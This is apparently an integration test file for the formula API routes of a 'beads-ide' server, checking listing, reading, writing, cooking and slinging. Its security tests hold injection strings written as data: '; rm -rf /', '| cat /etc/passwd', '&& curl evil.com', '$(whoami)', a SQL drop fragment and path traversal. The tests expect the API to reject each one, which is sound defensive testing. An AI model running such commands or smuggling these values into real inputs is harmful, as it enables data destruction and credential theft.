import type {
  CookResult,
  Formula,
  FormulaApiError,
  FormulaListResponse,
  FormulaReadResponse,
  SlingResult,
} from "@beads-ide/shared";
import { Hono } from "hono";
/**
 * Integration tests for formula routes.
 * Tests the actual API endpoints against the real bd/gt CLI.
 */
import { beforeAll, describe, expect, it } from "vite-plus/test";
import { formulas } from "../../src/routes/formulas.js";

// Create test app with formulas routes
const app = new Hono();
app.route("/api", formulas);

describe("Formula Routes", () => {
  describe("GET /api/formulas", () => {
    it("returns a list of formulas from search paths", async () => {
      const res = await app.request("/api/formulas");
      expect(res.status).toBe(200);

      const data = (await res.json()) as FormulaListResponse;
      expect(data).toHaveProperty("ok", true);
      expect(data).toHaveProperty("formulas");
      expect(data).toHaveProperty("count");
      expect(data).toHaveProperty("searchPaths");
      expect(Array.isArray(data.formulas)).toBe(true);
      expect(data.count).toBe(data.formulas.length);
      expect(Array.isArray(data.searchPaths)).toBe(true);

      // Verify formula structure if there are any formulas
      if (data.formulas.length > 0) {
        const formula = data.formulas[0];
        expect(formula).toHaveProperty("name");
        expect(formula).toHaveProperty("path");
        expect(formula).toHaveProperty("searchPath");
        expect(formula).toHaveProperty("searchPathLabel");
      }
    });
  });

  describe("GET /api/formulas/:name", () => {
    let validFormula: Formula | null = null;

    beforeAll(async () => {
      // Get a valid formula name from the list
      const res = await app.request("/api/formulas");
      if (res.status === 200) {
        const data = (await res.json()) as FormulaListResponse;
        if (data.formulas.length > 0) {
          validFormula = data.formulas[0];
        }
      }
    });

    it("returns formula content and parsed structure", async () => {
      if (!validFormula) {
        console.log("Skipping test: no formulas found");
        return;
      }

      const res = await app.request(`/api/formulas/${validFormula.name}`);
      expect(res.status).toBe(200);

      const data = (await res.json()) as FormulaReadResponse;
      expect(data).toHaveProperty("ok", true);
      expect(data).toHaveProperty("name", validFormula.name);
      expect(data).toHaveProperty("path");
      expect(data).toHaveProperty("content");
      expect(typeof data.content).toBe("string");
      expect(data.content.length).toBeGreaterThan(0);

      // Parsed structure is optional (may fail if formula has syntax errors)
      if (data.parsed) {
        expect(data.parsed).toHaveProperty("name");
      }
    });

    it("returns 404 for non-existent formula", async () => {
      const res = await app.request("/api/formulas/nonexistent-formula-xyz123");
      expect(res.status).toBe(404);

      const data = (await res.json()) as FormulaApiError;
      expect(data).toHaveProperty("ok", false);
      expect(data).toHaveProperty("error");
      expect(data).toHaveProperty("code", "NOT_FOUND");
    });

    it("returns 400 for invalid formula name format", async () => {
      const res = await app.request("/api/formulas/invalid;injection");
      expect(res.status).toBe(400);

      const data = (await res.json()) as FormulaApiError;
      expect(data).toHaveProperty("ok", false);
      expect(data).toHaveProperty("code", "INVALID_NAME");
    });

    it("rejects formula names with shell metacharacters", async () => {
      const dangerousNames = ["test$(whoami)", "test|cat", "test;rm", "test`id`"];

      for (const name of dangerousNames) {
        const res = await app.request(`/api/formulas/${encodeURIComponent(name)}`);
        expect(res.status).toBe(400);

        const data = (await res.json()) as FormulaApiError;
        expect(data.code).toBe("INVALID_NAME");
      }
    });
  });

  describe("PUT /api/formulas/:name", () => {
    it("returns 400 for invalid formula name", async () => {
      const res = await app.request("/api/formulas/invalid;name", {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: '[formula]\nname = "test"' }),
      });
      expect(res.status).toBe(400);

      const data = (await res.json()) as FormulaApiError;
      expect(data.code).toBe("INVALID_NAME");
    });

    it("returns 400 for missing content", async () => {
      const res = await app.request("/api/formulas/test-formula", {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({}),
      });
      expect(res.status).toBe(400);

      const data = (await res.json()) as FormulaApiError;
      expect(data.code).toBe("VALIDATION_ERROR");
    });

    it("returns 400 for invalid JSON body", async () => {
      const res = await app.request("/api/formulas/test-formula", {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: "not valid json",
      });
      expect(res.status).toBe(400);

      const data = (await res.json()) as FormulaApiError;
      expect(data.code).toBe("VALIDATION_ERROR");
    });

    // Note: Actual write tests would modify the filesystem and are best run in isolation
  });

  describe("POST /api/formulas/:name/cook", () => {
    let validFormula: Formula | null = null;

    beforeAll(async () => {
      const res = await app.request("/api/formulas");
      if (res.status === 200) {
        const data = (await res.json()) as FormulaListResponse;
        if (data.formulas.length > 0) {
          validFormula = data.formulas[0];
        }
      }
    });

    it("cooks a formula and returns proto beads", async () => {
      if (!validFormula) {
        console.log("Skipping test: no formulas found");
        return;
      }

      const res = await app.request(`/api/formulas/${validFormula.name}/cook`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({}),
      });

      const data = (await res.json()) as CookResult;

      // Cook may succeed or fail depending on formula requirements
      expect(data).toHaveProperty("ok");
      if (data.ok) {
        expect(data).toHaveProperty("formula");
        // steps may be present for workflow formulas
      } else {
        expect(data).toHaveProperty("error");
      }
    });

    it("returns 404 for non-existent formula", async () => {
      const res = await app.request("/api/formulas/nonexistent-xyz/cook", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({}),
      });
      expect(res.status).toBe(404);

      const data = (await res.json()) as CookResult;
      expect(data.ok).toBe(false);
      expect(data.error).toContain("not found");
    });

    it("returns 400 for invalid formula name", async () => {
      const res = await app.request("/api/formulas/invalid;name/cook", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({}),
      });
      expect(res.status).toBe(400);

      const data = (await res.json()) as CookResult;
      expect(data.ok).toBe(false);
    });
  });

  describe("POST /api/formulas/:name/sling", () => {
    let validFormula: Formula | null = null;

    beforeAll(async () => {
      const res = await app.request("/api/formulas");
      if (res.status === 200) {
        const data = (await res.json()) as FormulaListResponse;
        if (data.formulas.length > 0) {
          validFormula = data.formulas[0];
        }
      }
    });

    it("returns 400 for missing target", async () => {
      if (!validFormula) {
        console.log("Skipping test: no formulas found");
        return;
      }

      const res = await app.request(`/api/formulas/${validFormula.name}/sling`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({}),
      });
      expect(res.status).toBe(400);

      const data = (await res.json()) as SlingResult;
      expect(data.ok).toBe(false);
      expect(data.error).toContain("target");
    });

    it("returns 400 for invalid target format", async () => {
      if (!validFormula) {
        console.log("Skipping test: no formulas found");
        return;
      }

      const res = await app.request(`/api/formulas/${validFormula.name}/sling`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ target: "invalid-target-format" }),
      });
      expect(res.status).toBe(400);

      const data = (await res.json()) as SlingResult;
      expect(data.ok).toBe(false);
    });

    it("returns 404 for non-existent formula", async () => {
      const res = await app.request("/api/formulas/nonexistent-xyz/sling", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ target: "bcc/polecats/test" }),
      });
      expect(res.status).toBe(404);

      const data = (await res.json()) as SlingResult;
      expect(data.ok).toBe(false);
      expect(data.error).toContain("not found");
    });

    it("returns 400 for invalid formula name", async () => {
      const res = await app.request("/api/formulas/invalid;name/sling", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ target: "bcc/polecats/test" }),
      });
      expect(res.status).toBe(400);

      const data = (await res.json()) as SlingResult;
      expect(data.ok).toBe(false);
    });

    // Note: Actual sling tests would dispatch work and are best run in controlled environments
  });
});

describe("Formula Data Structure", () => {
  it("returns proper formula fields for API consumption", async () => {
    const res = await app.request("/api/formulas");
    if (res.status !== 200) return;

    const data = (await res.json()) as FormulaListResponse;
    if (data.formulas.length === 0) return;

    const formula = data.formulas[0];

    // Required fields
    expect(typeof formula.name).toBe("string");
    expect(typeof formula.path).toBe("string");
    expect(typeof formula.searchPath).toBe("string");
    expect(typeof formula.searchPathLabel).toBe("string");

    // Path should be absolute
    expect(formula.path.startsWith("/")).toBe(true);

    // Name should not contain extension
    expect(formula.name).not.toContain(".formula.");
  });
});

describe("Security: Input Validation", () => {
  const dangerousInputs = [
    "$(whoami)",
    "`id`",
    "; rm -rf /",
    "| cat /etc/passwd",
    "&& curl evil.com",
    "'; DROP TABLE--",
    "../../../etc/passwd",
  ];

  it("rejects dangerous formula names in GET", async () => {
    for (const input of dangerousInputs) {
      const res = await app.request(`/api/formulas/${encodeURIComponent(input)}`);
      expect(res.status).toBe(400);
    }
  });

  it("rejects dangerous formula names in PUT", async () => {
    for (const input of dangerousInputs) {
      const res = await app.request(`/api/formulas/${encodeURIComponent(input)}`, {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: "test" }),
      });
      expect(res.status).toBe(400);
    }
  });

  it("rejects dangerous formula names in cook", async () => {
    for (const input of dangerousInputs) {
      const res = await app.request(`/api/formulas/${encodeURIComponent(input)}/cook`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({}),
      });
      expect(res.status).toBe(400);
    }
  });

  it("rejects dangerous formula names in sling", async () => {
    for (const input of dangerousInputs) {
      const res = await app.request(`/api/formulas/${encodeURIComponent(input)}/sling`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ target: "bcc/polecats/test" }),
      });
      expect(res.status).toBe(400);
    }
  });

  it("rejects dangerous sling targets", async () => {
    const res = await app.request("/api/formulas");
    if (res.status !== 200) return;

    const data = (await res.json()) as FormulaListResponse;
    if (data.formulas.length === 0) return;

    const formulaName = data.formulas[0].name;

    for (const input of dangerousInputs) {
      const res = await app.request(`/api/formulas/${formulaName}/sling`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ target: input }),
      });
      expect(res.status).toBe(400);
    }
  });
});
